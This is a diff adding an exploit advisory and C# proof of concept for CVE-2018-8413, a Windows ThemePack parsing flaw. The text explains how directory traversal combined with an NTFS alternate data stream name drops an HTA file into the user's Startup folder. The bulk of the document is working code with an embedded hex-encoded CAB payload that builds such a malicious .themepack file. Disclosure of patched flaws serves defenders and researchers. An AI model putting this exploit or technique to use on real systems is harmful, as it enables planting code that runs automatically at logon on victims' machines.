@@ -1,0 +1,147 @@
+# Exploit Title: Microsoft Windows 10 - Theme API 'ThemePack' File Parsing
+# Google Dork: n/a
+# Date: 2020-10-28
+# Exploit Author: Eduardo Braun Prado
+# Vendor Homepage: http://www.microsoft.com/
+# Software Link: http://www.microsoft.com/
+# Version: 10 v.1803 (17134.407)
+# Tested on: Windows 7, 8.0, 8.1, 10, Server 2012, Server 2012 R2, Server 2016, Server 2019
+# CVE : CVE-2018-8413
+# Discovered by: Eduardo Braun Prado
+
+[Details]
+
+Microsoft 'themepack' files are classic '.theme' files compressed for
+sharing over the internet. Theme files
+allows users to customize visual aspects of their device, such as icons
+for known features like 'My computer'
+and 'trash bin' folders, the default screensaver (which by the way
+allowed attackers to run '.scr' files located
+on shares upon applying a Theme, in the past. Refer to: CVE-2013-0810).
+ThemePack file type uses Microsoft 'CAB' format. The parser contains a
+vulnerability that allows attackers
+to create arbitrary files on arbitrary locations on the user´s system,
+by using the classic
+'parent directory' technique, and thus could lead to creation of some
+executable files on the
+startup folder. This executable will be run on next logon.
+
+
+Conditions:
+
+
+1) The 'themepack' file must contain a valid '[dot] theme' file.
+
+
+The parser allows creating '.theme' files on arbitrary locations, but
+the extension must be
+'.theme'. There´s a trick, though, to overcome this:
+
+NTFS Alternate Data Streams.
+
+By using a specially crafted name like "abc.hta:[dot] theme" it´s
+possible to trick the parser into
+dropping a file with an '[dot] hta' extension instead of the legitimate
+'[dot] theme', potentially allowing
+attackers to compromise the affected systems. The '[dot] hta' extension
+is a good choice since you can
+merge valid code with arbitrary text or binary files.
+
+Note: Patched on October, 2018 Microsoft monthly patch.
+
+
+[PoC]
+
+Proof of concept code that drops an 'hta' file to startup dir.
+
+
+Instructions:
+
+ - Create a new project on MS Visual Studio (any version, included free
+ones like 'Express'), choose 'Console Application'
+
+and at 'program . cs' replace the code with the code below
+
+Note: Source code targets dot NET 4.0 and up (previous versions might
+work fine though!)
+
+
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ThemePack
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            String exeDir = AppDomain.CurrentDomain.BaseDirectory;
+            Directory.SetCurrentDirectory(exeDir);
+
+            string tmpPath = Path.GetTempPath();
+
+            string tpd =
+"4D53434600000000AB010000000000002C000000000000000301010001000000000000009500000001000100930100000000000000003C508108200061612E2E5C2E2E5C2E2E5C2E2E5C2E2E5C2E2E5C726F616D696E675C6D6963726F736F66745C77696E646F77735C7374617274206D656E755C70726F6772616D735C737461727475705C6162632E6874613A2E7468656D6500B60133780E019301434B4D51C16A023110BD07F20F5EBC5A85D2163405DDB5871645CCB215BA1ED265C0E024B364E261FDFA66534BBD8499F7DE4CDE4BE68B5374F82AC55775020747294ACB1D9A7E6B1CA88CED4C7B1ED517F4522459413E06C2D1CE78C0A6043E47EAD2D8A741EC4C074149515984FF7E7A47EAD823A85982762646085EE5A5B5E58BC14CF231732735D63D47707BA2386E02305D420BDCC4C112374B08948F8963CE7352148474BB614BC119CC8014DA5EFF90A1BC09EDD5444B3ED76A7A785A3D3FAE5EDE8AE43E18CF9D09E0DB5ECD06B5EB88ED201EDA3BAF3504CEE834A7F84E56937B5DECB77A59AF27EBC3FA37DEC6A424213FA60684365248BA4DA537AA5CAEDECB8F4A8AF9E2E1F6133F";
+     
+           string tpf = exeDir + "\\C00L.themepack";
+
+            Console.WriteLine("\n\n
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+\n Microsoft Windows Theme API 'ThemePack' File Parsing Vulnerability
+PoC (CVE-2018-8413)  \n\n by: Eduardo Braun Prado \n\n
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
+
+            StreamWriter s = File.CreateText(tmpPath + "\\themepack000.h");
+
+            s.Write(tpd);
+          
+            s.Close();
+
+            FileStream f = File.OpenRead(tmpPath + "\\themepack000.h");
+
+            String ax = "";
+
+
+            byte[] b = new byte[f.Length];
+
+            UTF8Encoding temp = new UTF8Encoding(false);
+
+            while (f.Read(b, 0, b.Length) > 0)
+            {
+                ax = ax + temp.GetString(b);
+            }
+
+
+            String bx = ax.ToString();
+            String cx = "";
+
+            byte[] b02 = new byte[f.Length / 2];
+            for (int i = 0; i < f.Length; i += 2)
+            {
+                cx = bx.Substring(i, 2);
+                b02[i / 2] = Convert.ToByte(cx, 16);
+            }
+
+            File.WriteAllBytes(tpf, b02);
+
+            if (File.Exists(tpf))
+            {
+                long fsize = new FileInfo(tpf).Length;
+
+                if (fsize != 0)
+                {
+                    Console.WriteLine("\n\n\n Done! 'C00L." +
+"themepack' file created in the current directory. Vulnerable systems
+should plant an HTA on startup dir.");
+                }
+
+            }
+
+
+            }
+            }
+            }
